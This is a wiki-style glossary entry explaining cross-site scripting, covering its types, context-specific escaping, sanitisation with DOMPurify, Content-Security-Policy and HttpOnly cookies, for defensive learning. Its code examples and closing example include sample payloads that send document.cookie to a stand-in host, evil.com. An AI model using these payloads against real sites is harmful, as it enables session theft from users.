---
tags: [term, fullstack, auth, security]
category: Authentication & Security
---

# XSS (Cross-Site Scripting)

**Definition:** An attack where malicious JavaScript gets injected into a page and runs in another user's browser.

## How It Works
- Attacker submits input like `<script>steal(document.cookie)</script>`
- If the site doesn't sanitize it, the script executes for anyone who views that page
- The injected script runs with the full privileges of the page it's embedded in, it can read cookies (unless `HttpOnly`), read anything in `localStorage`/`sessionStorage`, make authenticated requests using the victim's session, capture keystrokes, or rewrite the DOM to phish credentials
- The core cause is always the same: untrusted input (from a form, URL parameter, database record originally submitted by another user, or a third-party API) ends up being interpreted as executable code or markup instead of inert text
- The browser has no way to distinguish "HTML the developer wrote" from "HTML that happens to contain a user's comment" once they're concatenated into the same response, everything in the HTML stream is equally trusted by default

## Why It Matters
- One of the most common web vulnerabilities, directly threatens auth tokens and user data
- It's consistently in the OWASP Top 10 because the root cause, mixing trusted code and untrusted data in the same channel, is easy to introduce and easy to miss in code review
- A single stored XSS vulnerability on a popular page can compromise every visitor who loads it, not just the attacker's own session, making it a much bigger blast radius than most other web vulnerabilities

## Common Pitfalls
- Rendering raw user input as HTML without escaping it
- Storing sensitive tokens in `localStorage`, readable by any injected script
- Using `dangerouslySetInnerHTML` (React), `v-html` (Vue), or `innerHTML` directly with user-controlled content instead of letting the framework's default text interpolation escape it automatically
- Escaping for the wrong context, HTML-escaping a value that's actually being inserted into a `<script>` block, a URL, or a CSS value doesn't protect against injection in those contexts, each context has different special characters that need escaping
- Relying only on client-side validation/sanitization, an attacker can bypass the browser entirely and POST directly to your API, so sanitization has to happen (or be re-verified) server-side too
- Trusting "safe" looking input like URLs or filenames, `javascript:alert(1)` is a valid, executable `href` value, and SVG files can embed `<script>` tags
- Blocklisting specific tags/strings (stripping `<script>`) instead of allowlisting safe markup, attackers have many equivalent payloads (`<img onerror=...>`, `<svg onload=...>`, encoded variants) that a naive blocklist won't catch

## Types of XSS
- **Stored (persistent) XSS** — the malicious payload is saved server-side (in a database, a comment field, a username) and served to every user who views that page. Highest impact, since it doesn't require tricking a specific victim into clicking a crafted link
- **Reflected XSS** — the payload is part of the request itself (typically a URL query parameter) and gets echoed back into the response unescaped. Requires tricking a victim into clicking a malicious link, so it usually spreads via phishing
- **DOM-based XSS** — the vulnerability lives entirely in client-side JavaScript that reads untrusted data (`location.hash`, `document.referrer`, a URL parameter) and writes it into the DOM (via `innerHTML`, `document.write`, `eval`) without ever touching the server, so server-side output encoding alone doesn't protect against it

## Under the Hood: Context-Specific Escaping
Escaping isn't one rule, it depends entirely on *where* in the document the untrusted value lands:

| Context | Dangerous characters | Correct escaping |
|---|---|---|
| HTML body text | `< > & " '` | HTML entity encode (`&lt;`, `&amp;`, etc.) |
| HTML attribute value | `" ' >` | Attribute encode, always quote attributes |
| URL parameter | `& = # ?` | `encodeURIComponent()` |
| Inline `<script>` block | `< / \` | JS string escaping (and avoid this entirely if possible) |
| CSS value | `( ) ; :` | CSS escaping, or avoid injecting into style entirely |

This is why frameworks that auto-escape (React's JSX, Vue's `{{ }}`, Django/Rails templates by default) are much safer by default than hand-built HTML strings, they apply the *correct* escaping for the context automatically, and force you to opt in explicitly (`dangerouslySetInnerHTML`, `| safe`, `mark_safe()`) when you want raw HTML.

## Comparison: XSS vs CSRF vs SQL Injection
| | XSS | [[CSRF (Cross-Site Request Forgery)]] | SQL Injection |
|---|---|---|---|
| What's exploited | Untrusted input rendered as code in the browser | The browser's automatic inclusion of credentials (cookies) on cross-site requests | Untrusted input concatenated into a database query |
| Runs where | Victim's browser | Victim's browser (forges a request) | The database server |
| Typical fix | Output encoding / escaping by context | Anti-CSRF tokens, `SameSite` cookies | Parameterized queries / prepared statements |
| Needs a prior XSS to fully mitigate defenses? | N/A | Sometimes, XSS can be used to read/steal a CSRF token | No |

## Code Example
```jsx
// Vulnerable: raw HTML injection
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
  // If `text` is `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>`,
  // that request fires the instant this renders.
}

// Safe: React escapes text content by default
function Comment({ text }) {
  return <div>{text}</div>; // rendered as literal text, not parsed as HTML
}
```

```http
# A Content-Security-Policy header as defense-in-depth:
# even if an injection slips through, the browser refuses to execute
# inline scripts or load scripts from untrusted origins.
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; object-src 'none'
```

## Code Example: DOM-Based XSS
```js
// Vulnerable: reads directly from the URL and writes to innerHTML
// https://example.com/search#<img src=x onerror=alert(document.cookie)>
const query = decodeURIComponent(location.hash.slice(1));
document.getElementById('results').innerHTML = `You searched for: ${query}`;
// The payload never touches the server at all — a server-side WAF or
// output encoding on the backend does nothing here, the injection and
// execution both happen entirely client-side.

// Safe: use textContent, which never parses its input as markup
const query = decodeURIComponent(location.hash.slice(1));
document.getElementById('results').textContent = `You searched for: ${query}`;
```

## Code Example: Sanitizing Rich Text Safely
```js
import DOMPurify from 'dompurify';

// User-submitted content that legitimately needs some HTML (bold, links, lists)
const rawHtml = getUserSubmittedBio();

// Allowlist-based sanitization — strips <script>, event handlers (onerror,
// onclick), javascript: URLs, and anything not on the allowed tag/attribute list
const clean = DOMPurify.sanitize(rawHtml, {
  ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'ul', 'li'],
  ALLOWED_ATTR: ['href'],
});

document.getElementById('bio').innerHTML = clean; // now safe to render
```

## Best Practices
- Let your framework's default templating/rendering escape output, avoid `dangerouslySetInnerHTML`/`innerHTML`/`v-html` unless the content is coming from a trusted sanitizer (e.g. DOMPurify) or a trusted source
- Set a `Content-Security-Policy` header restricting where scripts can load from and disallowing inline `<script>` execution, this contains damage even if an escaping bug slips through
- Mark auth cookies `HttpOnly` so client-side JavaScript, including injected malicious JavaScript, can't read them at all; see [[Cookies]]
- Sanitize on the server for anything that will be stored and re-displayed to other users, never trust client-side-only validation
- Use an allowlist-based HTML sanitizer (DOMPurify, `bleach` in Python) when you genuinely need to accept limited rich text (like a comment editor with bold/italic), rather than trying to hand-write a blocklist
- Set the `X-Content-Type-Options: nosniff` header so browsers don't try to "helpfully" reinterpret a file's content type in a way that turns an uploaded image into executable script

## FAQ
**Does HTTPS protect against XSS?** No. HTTPS protects data in transit between browser and server; XSS is an injection vulnerability in how the page itself is constructed. A site can be perfectly encrypted and still be fully vulnerable to XSS.

**Can XSS happen in a React/Vue/Angular app if I never use `dangerouslySetInnerHTML`?** It's much harder, but not impossible, unsafe URL schemes in `href`/`src` attributes, third-party npm packages that manipulate the DOM directly, and server-rendered HTML that the client-side app later mounts into can all still introduce it.

**Why can't cookies just always be `HttpOnly`?** They can and should be for auth tokens, `HttpOnly` cookies are invisible to JavaScript entirely (including your own legitimate code), but they're still sent automatically by the browser, which is exactly the behavior you want for session identifiers. The tradeoff is `HttpOnly` cookies can't be read by client-side JS for legitimate reasons either, so any client-side logic that needs to know "is the user logged in" needs a separate, non-sensitive signal.

**Does a Content-Security-Policy replace the need for output encoding?** No, it's defense-in-depth, not a substitute. CSP reduces the *impact* of a successful injection (blocking inline scripts, restricting script sources) but doesn't prevent the injection itself. A well-configured CSP can still be bypassed if the allowed script sources include something exploitable, like a JSONP endpoint or an old library version with a known gadget.

**Can XSS lead to full account takeover, not just data theft?** Yes. If a session token is readable (no `HttpOnly`), the attacker can impersonate the victim entirely, change their email/password, and lock the real user out. Even with `HttpOnly` cookies, injected JavaScript can still perform authenticated actions on the victim's behalf, like a CSRF attack, but launched from inside the trusted origin, which sidesteps `SameSite` cookie protections since the request genuinely originates from the legitimate site.

## Common Interview Questions
- "Explain the difference between stored, reflected, and DOM-based XSS." — Expect the distinction of where the payload is persisted (database vs URL vs never leaves the browser) and what that implies about server-side defenses being sufficient or not
- "How does `HttpOnly` help, and what doesn't it protect against?" — Expect an answer noting it blocks cookie theft via JS but does nothing to stop an injected script from making authenticated requests using the browser's ambient session
- "Why is a blocklist (stripping `<script>` tags) a weak XSS defense?" — Expect a discussion of the many equivalent attack vectors (event handler attributes, `javascript:` URLs, encoded payloads) that bypass a naive tag blocklist, versus allowlist-based sanitization or automatic context-aware escaping

## Comparison: Escaping vs Sanitization vs CSP
| Defense | What it does | When it applies |
|---|---|---|
| Output encoding/escaping | Converts special characters so they render as text, not markup | Every place untrusted data is inserted into HTML/JS/URL/CSS |
| Sanitization (allowlist) | Strips disallowed tags/attributes from HTML you intentionally allow | Rich text fields where some HTML is legitimate |
| Content-Security-Policy | Restricts what the browser will execute/load, regardless of how it got there | Site-wide, as a defense-in-depth backstop |
| `HttpOnly` cookies | Hides sensitive cookies from JavaScript entirely | Session/auth cookies specifically |

## Real-World Example
A forum comment box that doesn't escape HTML, letting an attacker post a script that steals other users' sessions. In practice, large-scale stored XSS incidents have hit social platforms via profile fields, comment sections, and even SVG file uploads, in each case, one unsanitized input field became a payload delivery mechanism that executed in every subsequent visitor's browser until the vulnerable field was patched and the malicious content purged.

## Related Terms
- [[CSRF (Cross-Site Request Forgery)]]
- [[Cookies]]
- [[JWT (JSON Web Token)]]
- [[CORS (Cross-Origin Resource Sharing)]]

## Example
A forum comment box that doesn't escape HTML, letting an attacker post a script that steals other users' sessions, `<script>fetch('https://evil.com/?c=' + document.cookie)</script>` submitted as a comment runs in the browser of every subsequent visitor to that thread, silently exfiltrating their session cookie to the attacker's server.
